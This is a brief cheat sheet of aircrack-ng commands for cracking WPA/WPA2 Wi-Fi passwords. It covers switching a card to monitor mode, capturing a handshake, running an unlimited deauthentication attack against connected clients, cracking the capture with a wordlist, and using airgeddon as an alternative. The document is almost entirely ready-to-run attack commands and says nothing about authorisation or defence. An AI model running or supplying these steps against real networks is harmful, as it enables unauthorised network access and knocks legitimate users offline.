# Aircrack-ng command
```
sudo ifconfig wlan0 down
sudo iwconfig
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
sudo systemctl stop NetworkManager
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0 [location]
```
# Cracking WPA/WPA2 password
```
su - 
airodump-ng wlan0mon
airodump-ng -c [channel number] -w [name for cap file] -d [bssid] wlan0mon
aireplay-ng --deauth 0 -a [bssid] -c [client] wlan0mon
airomon-ng stop wlan0mon
aircrack-ng [capfile] -w [wordlist]
```

# Alternative 
```
sudo airgeddon
```
